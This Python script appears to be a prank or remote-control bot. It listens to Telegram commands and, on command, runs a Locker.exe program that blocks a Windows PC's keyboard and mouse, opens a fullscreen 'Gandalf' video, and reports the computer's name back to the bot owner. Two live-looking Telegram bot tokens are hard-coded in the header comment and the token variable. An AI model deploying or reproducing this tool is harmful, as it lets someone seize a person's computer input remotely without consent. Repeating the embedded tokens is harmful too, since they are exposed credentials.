#---------------------------------------------------------------#
#
#bot token: 1462769482:AAEU84lWytoJNXkt5bf6rVGjX_fqpqV71ds
#bot link: t.me/GandalfScreen_bot
#
#Bot for starting gandalf, blocking keyboard and mouse
#In telegram you can use:
#   /ping - check if bot is working
#   /devices - check active bots
#   /block - block keyboard and mouse
#   /unblock - unblock it
#   /Gandalf - start Gandalf script (with locking)
#
#Write bot start command for helper to start this bot
#
#---------------------------------------------------------------#

import requests
import time
import keyboard
import ctypes
import os

api_url = 'https://api.telegram.org/'
token = 'bot1774401260:AAGhyHAg7Jzb8WvaNS4OmWnOT7UkCzyrKhA'     #Bot token url
url = 'https://api.telegram.org/' + token + '/'
gandalf_link = 'https://youtu.be/Sagg08DrO5U'                   #Gandalf video link

start_locker = 'start Locker.exe'                               #Start locker
disable_locker = 'taskkill /f /im Locker.exe'                   #Disable locker

update_offset = 0                                               #Offest to avoid updates overflow and recheking old messages

def get_updates_json(request):                                  #Gets all updates from bot
    response = requests.get(request + 'getUpdates?offset=' + str(update_offset))
    return response.json()

def last_update(data):                                          #Gets only last update from json
    results = data['result']
    if len(results) == 0:
        return ''
    total_updates = len(results) - 1
    return results[total_updates]

def get_chat_id(update):                                        #Gets chat id from message
    chat_id = update['message']['chat']['id']
    return chat_id

def msg_text(msg):                                              #Gets message text
    if 'text' in msg['message']:
        return msg['message']['text']
    return ''

def send_message(chat, text):                                   #Send messages
    params = {'chat_id': chat, 'text': text}
    response = requests.post(url + 'sendMessage', data=params)
    return response

def run_gandalf():                                              #Gandalf script
    os.system(start_locker)
    time.sleep(3)
    os.system('start ' + gandalf_link)
    time.sleep(7)
    keyboard.press_and_release('f')                             #F - for fullscreen mode


#---------------------------------------------------------------#


msg = last_update( get_updates_json(url) )                      #Reading old messages to not recheking it later
update_offset = msg['update_id']

while True:
    msg = last_update( get_updates_json(url) )                  #Checks anything new from bot

    if msg != '' and msg['update_id'] != update_offset:         #If message is new and it isn't empty

        update_offset = msg['update_id']                        #Not to check one message many times
        master_id = get_chat_id(msg)                            #When scripts start it must run with only one master device

        if msg_text(msg) == '/gandalf':                         #Gandalf
            run_gandalf()
        
        if msg_text(msg) == '/block':                           #Blocking
            os.system(start_locker)

        if msg_text(msg) == '/unblock':                         #Unblocking
            os.system(disable_locker)

        if msg_text(msg) == '/ping':                            #Ping
            send_message(master_id, '.')

        if msg_text(msg) == '/devices':                         #Active devices
            send_message(master_id, str(os.environ['COMPUTERNAME']))
    #time.sleep(100)